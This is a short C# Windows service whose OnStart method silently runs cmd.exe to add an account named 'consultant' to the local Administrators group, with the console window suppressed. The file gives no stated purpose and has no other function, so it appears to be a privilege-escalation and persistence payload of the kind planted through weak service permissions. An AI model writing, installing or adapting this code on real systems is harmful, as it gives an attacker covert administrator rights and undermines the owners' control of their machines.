using System.ServiceProcess;
using System.Diagnostics;

public class AdminService : ServiceBase
{
    public AdminService()
    {
        this.ServiceName = "AdminService";
    }

    protected override void OnStart(string[] args)
    {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c net localgroup administrators consultant /add");
        processStartInfo.CreateNoWindow = true;
        processStartInfo.UseShellExecute = false;
        Process.Start(processStartInfo);
    }

    protected override void OnStop()
    {
    }

}
